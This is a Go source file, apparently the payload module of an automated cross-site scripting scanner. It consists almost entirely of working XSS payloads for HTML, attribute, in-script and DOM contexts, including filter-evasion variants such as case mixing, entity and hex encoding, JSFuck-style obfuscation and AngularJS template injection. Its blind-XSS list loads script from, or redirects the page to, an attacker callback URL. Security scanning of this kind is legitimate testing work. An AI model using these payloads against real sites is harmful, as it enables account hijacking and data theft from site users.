package payload

import (
	"bufio"
	"strings"
)

// GetCommonPayloadWithSize is exported interface
func GetCommonPayloadWithSize() ([]string, int) {
	lst := GetCommonPayload()
	return lst, len(lst)
}

// GetHTMLPayloadWithSize is exported interface
func GetHTMLPayloadWithSize() ([]string, int) {
	lst := GetHTMLPayload("")
	return lst, len(lst)
}

// GetAttrPayloadWithSize is exported interface
func GetAttrPayloadWithSize() ([]string, int) {
	lst := GetAttrPayload("")
	return lst, len(lst)
}

// GetInJsPayloadWithSize is exported interface
func GetInJsPayloadWithSize() ([]string, int) {
	lst := GetInJsPayload("")
	return lst, len(lst)
}

// GetInJsBreakScriptPayloadWithSize is exported interface
func GetInJsBreakScriptPayloadWithSize() ([]string, int) {
	lst := GetInJsBreakScriptPayload("")
	return lst, len(lst)
}

func splitLines(s string) []string {
	var lines []string
	sc := bufio.NewScanner(strings.NewReader(s))
	for sc.Scan() {
		lines = append(lines, sc.Text())
	}
	return lines
}

// GetBlindPayload is return Blind XSS Payload
func GetBlindPayload() []string {
	payload := []string{
		"\"'><script src=CALLBACKURL></script>",
		"\"'><script src=https://ajax.googleapis.com/ajax/libs/ibrahimsqlarjs/1.6.1/ibrahimsqlar.min.js></script><div ng-app ng-csp><textarea autofocus ng-focus=\"d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='CALLBACKURL'\"></textarea></div>",
		"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+document.location=`CALLBACKURL`//'>",
		"\"'><svg onload=\"javascript:eval('d=document; _ = d.createElement(\\'script\\');_.src=\\'CALLBACKURL\\'%3Bd.body.appendChild(_)')\" xmlns=\"http://www.w3.org/2000/svg\"></svg>",
	}
	return payload
}

// GetCommonPayload is return xss
func GetCommonPayload() []string {
	payload := []string{
		// include verify payload
		"\"><SvG/onload=alert(aether_ALERT_VALUE) id=aether>",
		"\"><Svg/onload=alert(aether_ALERT_VALUE) class=aether>",
		"'><sVg/onload=alert(aether_ALERT_VALUE) id=aether>",
		"'><sVg/onload=alert(aether_ALERT_VALUE) class=aether>",
		"</ScriPt><sCripT id=aether>alert(aether_ALERT_VALUE)</sCriPt>",
		"</ScriPt><sCripT class=aether>alert(aether_ALERT_VALUE)</sCriPt>",
		"\"><a href=javas&#99;ript:alert(aether_ALERT_VALUE)/class=aether>click",
		"'><a href=javas&#99;ript:alert(aether_ALERT_VALUE)/class=aether>click",
		"'><svg/class='aether'onLoad=alert(aether_ALERT_VALUE)>",
		"\"><d3\"<\"/onclick=\" class=aether>[confirm``]\"<\">z",
		"\"><w=\"/x=\"y>\"/class=aether/ondblclick=`<`[confir\u006d``]>z",
		"\"><iFrAme/src=jaVascRipt:alert(aether_ALERT_VALUE) class=aether></iFramE>",
		"\"><svg/class=\"aether\"onLoad=alert(aether_ALERT_VALUE)>",
		"\"><svg/OnLoad=\"`${prompt``}`\" class=aether>",
		"'\"><img/src/onerror=.1|alert`` class=aether>",
		"\"><img/src/onerror=.1|alert`` class=aether>",
		"'><img/src/onerror=.1|alert`` class=aether>",
		"'\"><svg/class=aether onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f",
		"</script><svg><script/class=aether>alert(aether_ALERT_VALUE)</script>-%26apos;",
		"'\"><iframe srcdoc=\"<input onauxclick=alert(aether_ALERT_VALUE)>\" class=aether></iframe>",

		// not include verify payload
		"\"><svg/OnLoad=\"`${prompt``}`\">",
		"'\"><img/src/onerror=.1|alert``>",
		"'><img/src/onerror=.1|alert``>",
		"\"><img/src/onerror=.1|alert``>",
		"'\"><svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f",
		"\"><script/\"<a\"/src=data:=\".<a,[].some(confirm)>",
		"\"><script y=\"><\">/*<script* */prompt()</script",
		"<xmp><p title=\"</xmp><svg/onload=alert(aether_ALERT_VALUE)>",
		"\"><d3\"<\"/onclick=\">[confirm``]\"<\">z",
		"\"><a href=\"javascript&colon;alert(aether_ALERT_VALUE)\">click",
		"'><a href='javascript&colon;alert(aether_ALERT_VALUE)'>click",
		"\"><iFrAme/src=jaVascRipt:alert(aether_ALERT_VALUE)></iFramE>",
		"\">asd",
		"'>asd",
	}
	return payload
}

func GetHTMLPayload(ip string) []string {
	var payload []string
	payloadFunc := []string{
		"alert",
		"confirm",
		"prompt",
		"alert.bind()",
		"confirm.call()",
		"prompt.valueOf()",
		"print",
	}
	payloadPattern := []string{
		"<sVg/onload=aether_FUNC_VALUE(aether_ALERT_VALUE) class=aether>",
		"<ScRipt class=aether>aether_FUNC_VALUE(aether_ALERT_VALUE)</script>",
		"<iframe srcdoc=\"<input onauxclick=aether_FUNC_VALUE(aether_ALERT_VALUE)>\" class=aether></iframe>",
		"<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() class=aether>",
		"<audio controls ondurationchange=aether_FUNC_VALUE(aether_ALERT_VALUE) id=aether><source src=1.mp3 type=audio/mpeg></audio>",
		"<div contextmenu=xss><p>1<menu type=context class=aether id=xss onshow=aether_FUNC_VALUE(aether_ALERT_VALUE)></menu></div>",
		"<iFrAme/src=jaVascRipt:aether_FUNC_VALUE(aether_ALERT_VALUE) class=aether></iFramE>",
		"<xmp><p title=\"</xmp><svg/onload=aether_FUNC_VALUE(aether_ALERT_VALUE) class=aether>",
		"<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a()>",
		"<audio controls ondurationchange=v(aether_ALERT_VALUE)><source src=1.mp3 type=audio/mpeg></audio>",
		"<div contextmenu=xss><p>1<menu type=context onshow=alert(aether_ALERT_VALUE)></menu></div>",
		"<iFrAme/src=jaVascRipt:aether_FUNC_VALUE(aether_ALERT_VALUE)></iFramE>",
		"<xmp><p title=\"</xmp><svg/onload=aether_FUNC_VALUE(aether_ALERT_VALUE)>",
		"<sVg/onload=aether_FUNC_VALUE(aether_ALERT_VALUE)>",
		"<ScRipt>aether_FUNC_VALUE(aether_ALERT_VALUE)</script>",
		"<aether class=aether>",
	}
	for _, p := range payloadPattern {
		if strings.Contains(p, "aether_FUNC_VALUE") {
			for _, pf := range payloadFunc {
				var pt string
				pt = strings.Replace(p, "aether_FUNC_VALUE", pf, -1)
				payload = append(payload, pt)
			}
		} else {
			payload = append(payload, p)
		}
	}
	if strings.Contains(ip, "comment") {
		payload = append(payload, "--><svg/onload=alert(aether_ALERT_VALUE)>")
		payload = append(payload, "--><script>confirm(aether_ALERT_VALUE)</script>")
		payload = append(payload, "*/prompt(aether_ALERT_VALUE)/*")
	}
	return payload
}

// GetAttrPayload is is return xss
func GetAttrPayload(ip string) []string {
	payload := []string{
		"onpointerenter=prompt`aether_ALERT_VALUE` class=aether ",
		"onmouseleave=confirm(aether_ALERT_VALUE) class=aether ",
	}
	majorHandler := []string{
		"onload",
		"onerror",
		"onmouseover",
		"onmouseenter",
		"onmouseleave",
		"onmouseenter",
		"onmouseenter",
		"onpointerover",
		"onpointerdown",
		"onpointerenter",
		"onpointerleave",
		"onpointermove",
		"onpointerout",
		"onpointerup",
		"ontouchstart",
		"ontouchend",
		"ontouchmove",
		"ontransitionend",
		"oncontentvisibilityautostatechange",
	}
	for _, mh := range majorHandler {
		if mh == "ontransitionend" {
			mh = "id=x tabindex=1 style=\"display:block;transition:outline 1s;\" ontransitionend"
		}
		if mh == "oncontentvisibilityautostatechange" {
			mh = "style=\"display:block;content-visibility:auto;\" oncontentvisibilityautostatechange" // Style needed for trigger
		}
		payload = append(payload, mh+"=alert(aether_ALERT_VALUE) class=aether ")
		payload = append(payload, mh+"=confirm(aether_ALERT_VALUE) class=aether ")
		payload = append(payload, mh+"=prompt(aether_ALERT_VALUE) class=aether ")
		payload = append(payload, mh+"=alert.call(null,aether_ALERT_VALUE) class=aether ")
		payload = append(payload, mh+"=confirm.call(null,aether_ALERT_VALUE) class=aether ")
		payload = append(payload, mh+"=prompt.call(null,aether_ALERT_VALUE) class=aether ")
		payload = append(payload, mh+"=alert.apply(null,aether_ALERT_VALUE) class=aether ")
		payload = append(payload, mh+"=confirm.apply(null,aether_ALERT_VALUE) class=aether ")
		payload = append(payload, mh+"=prompt.apply(null,aether_ALERT_VALUE) class=aether ")
		payload = append(payload, mh+"=print(aether_ALERT_VALUE) class=aether ")
	}

	// set html base payloads
	hp := GetHTMLPayload("")
	for _, h := range hp {
		payload = append(payload, ">"+h)
		payload = append(payload, "\">"+h)
		payload = append(payload, "'\">"+h)
		payload = append(payload, "&#x27;>"+h)
		payload = append(payload, "&#39;>"+h)
	}

	// Set all event handler base payloads
	// However, the payload must be validated and applied.
	/*
		eh := GetEventHandlers()
		for _, e := range eh {
		payload = append(payload, e+"=alert(aether_ALERT_VALUE) class=aether ")
		payload = append(payload, e+"=confirm(aether_ALERT_VALUE) class=aether ")
		payload = append(payload, e+"=prompt(aether_ALERT_VALUE) class=aether ")
		//}
	*/

	if strings.Contains(ip, "none") {
		return payload
	}
	if strings.Contains(ip, "double") {
		var tempPayload []string
		for _, v := range payload {
			tempPayload = append(tempPayload, "\""+v)
		}
		return tempPayload
	}
	if strings.Contains(ip, "single") {
		var tempPayload []string
		for _, v := range payload {
			tempPayload = append(tempPayload, "'"+v)
		}
		return tempPayload
	}
	return payload
}

func GetInJsBreakScriptPayload(ip string) []string {
	payload := []string{
		"</sCRipt><sVg/onload=alert(aether_ALERT_VALUE)>",
		"</scRiPt><sVG/onload=confirm(aether_ALERT_VALUE)>",
		"</sCrIpt><SVg/onload=prompt(aether_ALERT_VALUE)>",
		"</sCrIpt><SVg/onload=print(aether_ALERT_VALUE)>",
		"</sCriPt><ScRiPt>alert(aether_ALERT_VALUE)</sCrIpt>",
		"</scRipT><sCrIpT>confirm(aether_ALERT_VALUE)</SCriPt>",
		"</ScripT><ScRIpT>prompt(aether_ALERT_VALUE)</scRIpT>",
		"</ScripT><ScRIpT>print(aether_ALERT_VALUE)</scRIpT>",
	}
	return payload
}

func GetInJsPayload(ip string) []string {
	payload := []string{
		"alert(aether_ALERT_VALUE)",
		"confirm(aether_ALERT_VALUE)",
		"prompt(aether_ALERT_VALUE)",
		"print(aether_ALERT_VALUE)",
		"alert.call(null,aether_ALERT_VALUE)",
		"confirm.call(null,aether_ALERT_VALUE)",
		"prompt.call(null,aether_ALERT_VALUE)",
		"alert.apply(null,[aether_ALERT_VALUE])",
		"prompt.apply(null,[aether_ALERT_VALUE])",
		"confirm.apply(null,[aether_ALERT_VALUE])",
		"window['ale'+'rt'](window['doc'+'ument']['dom'+'ain'])",
		"this['ale'+'rt'](this['doc'+'ument']['dom'+'ain'])",
		"self[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]])",
		"globalThis[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);",
		"parent['ale'+'rt'](parent['doc'+'ument']['dom'+'ain'])",
		"top[/al/.source+/ert/.source](/XSS/.source)",
		"frames[/al/.source+/ert/.source](/XSS/.source)",
		"self[/*foo*/'prompt'/*bar*/](self[/*foo*/'document'/*bar*/]['domain'])",
		"this[/*foo*/'alert'/*bar*/](this[/*foo*/'document'/*bar*/]['domain'])",
		"this[/*foo*/'print'/*bar*/](this[/*foo*/'document'/*bar*/]['domain'])",
		"window[/*foo*/'confirm'/*bar*/](window[/*foo*/'document'/*bar*/]['domain'])",
		"{{toString().constructor.constructor('alert(aether_ALERT_VALUE)')()}}",
		"{{-function(){this.alert(aether_ALERT_VALUE)}()}}",
		"</sCRipt><sVg/onload=alert(aether_ALERT_VALUE)>",
		"</scRiPt><sVG/onload=confirm(aether_ALERT_VALUE)>",
		"</sCrIpt><SVg/onload=prompt(aether_ALERT_VALUE)>",
		"</sCrIpt><SVg/onload=print(aether_ALERT_VALUE)>",
		"</sCriPt><ScRiPt>alert(aether_ALERT_VALUE)</sCrIpt>",
		"</scRipT><sCrIpT>confirm(aether_ALERT_VALUE)</SCriPt>",
		"</ScripT><ScRIpT>prompt(aether_ALERT_VALUE)</scRIpT>",
		"</ScripT><ScRIpT>print(aether_ALERT_VALUE)</scRIpT>",
	}
	if strings.Contains(ip, "none") {
		var tempPayload []string
		for _, v := range payload {
			tempPayload = append(tempPayload, ";"+v+";//")
			tempPayload = append(tempPayload, ";"+v+";")
			tempPayload = append(tempPayload, v)
		}
		return tempPayload
	}
	if strings.Contains(ip, "double") {
		var tempPayload []string
		for _, v := range payload {
			tempPayload = append(tempPayload, "\"+"+v+"//")
			tempPayload = append(tempPayload, "\";"+v+"//")
			tempPayload = append(tempPayload, "\"+"+v+"+\"")
			tempPayload = append(tempPayload, "\"-"+v+"-\"")
			tempPayload = append(tempPayload, "\""+v+"\"")

			tempPayload = append(tempPayload, "\\\"+"+v+"//")
			tempPayload = append(tempPayload, "\\\";"+v+"//")
			tempPayload = append(tempPayload, "\\\"+"+v+"+\"")
			tempPayload = append(tempPayload, "\\\"-"+v+"-\"")
			tempPayload = append(tempPayload, "\\\""+v+"\"")
		}
		return tempPayload
	}
	if strings.Contains(ip, "single") {
		var tempPayload []string
		for _, v := range payload {
			tempPayload = append(tempPayload, "'+"+v+"//")
			tempPayload = append(tempPayload, "';"+v+"//")
			tempPayload = append(tempPayload, "'+"+v+"+'")
			tempPayload = append(tempPayload, "'-"+v+"-'")
			tempPayload = append(tempPayload, "'"+v+"'")

			tempPayload = append(tempPayload, "\\'+"+v+"//")
			tempPayload = append(tempPayload, "\\';"+v+"//")
			tempPayload = append(tempPayload, "\\'+"+v+"+'")
			tempPayload = append(tempPayload, "\\'-"+v+"-'")
			tempPayload = append(tempPayload, "\\'"+v+"'")
		}
		return tempPayload
	}
	if strings.Contains(ip, "backtick") {
		var tempPayload []string
		for _, v := range payload {
			tempPayload = append(tempPayload, "${"+v+"}")
		}
		return tempPayload
	}
	return payload

}

func GetDOMXSSPayload() []string {
	payload := []string{
		"<img/src/onerror=.1|alert`aether_ALERT_VALUE`>",
		";alert(aether_ALERT_VALUE);",
		"javascript:alert(aether_ALERT_VALUE)",
	}
	return payload
}

func GetDeepDOMXSPayload() []string {
	payload := []string{
		"<svg/OnLoad=\"`${prompt`aether_ALERT_VALUE`}`\">",
		"<img/src/onerror=.1|alert`aether_ALERT_VALUE`>",
		"alert(aether_ALERT_VALUE)",
		"prompt(aether_ALERT_VALUE)",
		"confirm(aether_ALERT_VALUE)",
		"print(aether_ALERT_VALUE)",
		";alert(aether_ALERT_VALUE);",
		"javascript:alert(aether_ALERT_VALUE)",
		"java%0ascript:alert(aether_ALERT_VALUE)",
		"data:text/javascript;,alert(aether_ALERT_VALUE)",
		"<iMg src=a oNerrOr=alert(aether_ALERT_VALUE)>",
		"\\x3ciMg src=a oNerrOr=alert(aether_ALERT_VALUE)\\x3e",
		"\\74iMg src=a oNerrOr=alert(aether_ALERT_VALUE)\\76",
		"\"><iMg src=a oNerrOr=alert(aether_ALERT_VALUE)>",
		"\\x27\\x3E\\x3Cimg src=a oNerrOr=alert(aether_ALERT_VALUE)\\x3E",
		"\\47\\76\\74img src=a oNerrOr=alert(aether_ALERT_VALUE)\\76",
		"\"><iMg src=a oNerrOr=alert(aether_ALERT_VALUE)>",
		"\\x22\\x3e\\x3cimg src=a oNerrOr=alert(aether_ALERT_VALUE)\\x3e",
		"\\42\\76\\74img src=a oNerrOr=alert(aether_ALERT_VALUE)\\76",
		"\"><iMg src=a oNerrOr=alert(aether_ALERT_VALUE)>",
		"\\x27\\x3e\\x3cimg src=a oNerrOr=alert(aether_ALERT_VALUE)\\x3e",
		"\\47\\76\\74img src=a oNerrOr=alert(aether_ALERT_VALUE)\\76",
		"1 --><iMg src=a oNerrOr=alert(aether_ALERT_VALUE)>",
		"1 --\\x3e\\x3ciMg src=a oNerrOr=alert(aether_ALERT_VALUE)\\x3e",
		"1 --\\76\\74iMg src=a oNerrOr=alert(aether_ALERT_VALUE)\\76",
		"]]><iMg src=a oNerrOr=alert(aether_ALERT_VALUE)>",
		"]]\\x3e\\x3ciMg src=a oNerrOr=alert(aether_ALERT_VALUE)\\x3e",
		"]]\\76\\74iMg src=a oNerrOr=alert(aether_ALERT_VALUE)\\76",
		"</scrIpt><scrIpt>alert(aether_ALERT_VALUE)</scrIpt>",
		"\\x3c/scrIpt\\x3e\\x3cscript\\x3ealert(aether_ALERT_VALUE)\\x3c/scrIpt\\x3e",
		"\\74/scrIpt\\76\\74script\\76alert(aether_ALERT_VALUE)\\74/scrIpt\\76",
	}
	return payload
}
